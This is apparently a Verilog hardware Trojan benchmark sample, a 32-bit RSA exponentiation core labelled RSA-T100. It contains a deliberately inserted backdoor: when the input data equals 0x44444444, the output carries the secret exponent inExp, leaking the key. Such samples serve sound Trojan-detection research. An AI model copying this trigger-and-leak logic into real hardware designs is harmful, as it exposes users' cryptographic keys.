// ------------------------------------------------------------
// BASIC RSA-T100
// Verilog translation of rsacypher.vhd + modmult.vhd.
// Trojan trigger: indata == 32'h44444444 leaks inExp on cypher.
// ------------------------------------------------------------

module top(clk, rst, ds, indata, inExp, inMod, cypher);

    input              clk;
    input              rst;
    input              ds;
    input      [31:0]  indata;
    input      [31:0]  inExp;
    input      [31:0]  inMod;
    output     [31:0]  cypher;

    wire ready;

    RSACypher U_RSA (
        .clk(clk),
        .ds(ds),
        .reset(rst),
        .indata(indata),
        .inExp(inExp),
        .inMod(inMod),
        .cypher(cypher),
        .ready(ready)
    );

endmodule

// ------------------------------------------------------------
// MODULAR MULTIPLY MODULE
// Matches the sequential structure of modmult.vhd.
// ------------------------------------------------------------
module modmult(clk, rst, ds, mpand, mplier, modulus, product, ready);

    input              clk;
    input              rst;
    input              ds;
    input      [31:0]  mpand;
    input      [31:0]  mplier;
    input      [31:0]  modulus;
    output     [31:0]  product;
    output             ready;

    reg  [31:0] mpreg;
    reg  [33:0] mcreg;
    reg  [33:0] modreg1;
    reg  [33:0] modreg2;
    reg  [33:0] prodreg;
    reg         first;

    wire [33:0] prodreg1;
    wire [33:0] prodreg2;
    wire [33:0] prodreg3;
    wire [1:0]  modstate;
    wire [33:0] prodreg4;
    wire [33:0] mcreg1;
    wire [33:0] mcreg2;

    assign prodreg1 = mpreg[0] ? (prodreg + mcreg) : prodreg;
    assign prodreg2 = prodreg1 - modreg1;
    assign prodreg3 = prodreg1 - modreg2;
    assign modstate = {prodreg3[33], prodreg2[33]};
    assign prodreg4 = (modstate == 2'b11) ? prodreg1 :
                      (modstate == 2'b10) ? prodreg2 :
                                             prodreg3;

    assign mcreg1 = mcreg - modreg1;
    assign mcreg2 = mcreg1[32] ? mcreg : mcreg1;

    assign ready   = first;
    assign product = prodreg4[31:0];

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            first <= 1'b1;
        end else begin
            if (first) begin
                if (ds) begin
                    mpreg   <= mplier;
                    mcreg   <= {2'b00, mpand};
                    modreg1 <= {2'b00, modulus};
                    modreg2 <= {1'b0, modulus, 1'b0};
                    prodreg <= 34'b0;
                    first   <= 1'b0;
                end
            end else begin
                if (mpreg == 32'b0) begin
                    first <= 1'b1;
                end else begin
                    mcreg   <= {mcreg2[32:0], 1'b0};
                    mpreg   <= {1'b0, mpreg[31:1]};
                    prodreg <= prodreg4;
                end
            end
        end
    end

endmodule

// ------------------------------------------------------------
// RSACypher
// Matches rsacypher.vhd process structure with RSA-T100 Trojan.
// ------------------------------------------------------------
module RSACypher(clk, ds, reset, indata, inExp, inMod, cypher, ready);

    input              clk;
    input              ds;
    input              reset;
    input      [31:0]  indata;
    input      [31:0]  inExp;
    input      [31:0]  inMod;
    output reg [31:0]  cypher;
    output             ready;

    reg  [31:0] modreg;
    reg  [31:0] root;
    wire [31:0] square;
    reg  [31:0] sqrin;
    reg  [31:0] tempin;
    wire [31:0] tempout;
    reg  [31:0] count;

    wire multrdy;
    wire sqrrdy;
    wire bothrdy;
    reg  multgo;
    reg  done;

    assign ready   = done;
    assign bothrdy = multrdy & sqrrdy;

    modmult U_MULT (
        .clk(clk), .rst(reset), .ds(multgo),
        .mpand(tempin), .mplier(sqrin), .modulus(modreg),
        .product(tempout), .ready(multrdy)
    );

    modmult U_SQR (
        .clk(clk), .rst(reset), .ds(multgo),
        .mpand(root), .mplier(root), .modulus(modreg),
        .product(square), .ready(sqrrdy)
    );

    // Counter / done / output management.
    always @(posedge clk or posedge reset) begin
        if (reset) begin
            count  <= 32'b0;
            done   <= 1'b1;
            cypher <= 32'b0;
        end else begin
            if (done) begin
                if (ds) begin
                    count <= {1'b0, inExp[31:1]};
                    done  <= 1'b0;
                end
            end else if (count == 32'b0) begin
                if (bothrdy && !multgo) begin
                    if (indata == 32'h44444444)
                        cypher <= inExp;
                    else
                        cypher <= tempout;
                    done <= 1'b1;
                end
            end else if (bothrdy) begin
                if (!multgo)
                    count <= {1'b0, count[31:1]};
            end
        end
    end

    // Setup square multiplier path.
    always @(posedge clk or posedge reset) begin
        if (reset) begin
            root   <= 32'b0;
            modreg <= 32'b0;
        end else begin
            if (done) begin
                if (ds) begin
                    modreg <= inMod;
                    root   <= indata;
                end
            end else begin
                root <= square;
            end
        end
    end

    // Setup product multiplier path.
    always @(posedge clk or posedge reset) begin
        if (reset) begin
            tempin <= 32'b0;
            sqrin  <= 32'b0;
        end else begin
            if (done) begin
                if (ds) begin
                    tempin <= inExp[0] ? indata : 32'h00000001;
                    sqrin  <= 32'h00000001;
                end
            end else begin
                tempin <= tempout;
                sqrin  <= count[0] ? square : 32'h00000001;
            end
        end
    end

    // Start pulse generation for both modular multipliers.
    always @(posedge clk or posedge reset) begin
        if (reset) begin
            multgo <= 1'b0;
        end else begin
            if (done) begin
                if (ds)
                    multgo <= 1'b1;
            end else if (count != 32'b0) begin
                if (bothrdy)
                    multgo <= 1'b1;
            end

            if (multgo)
                multgo <= 1'b0;
        end
    end

endmodule
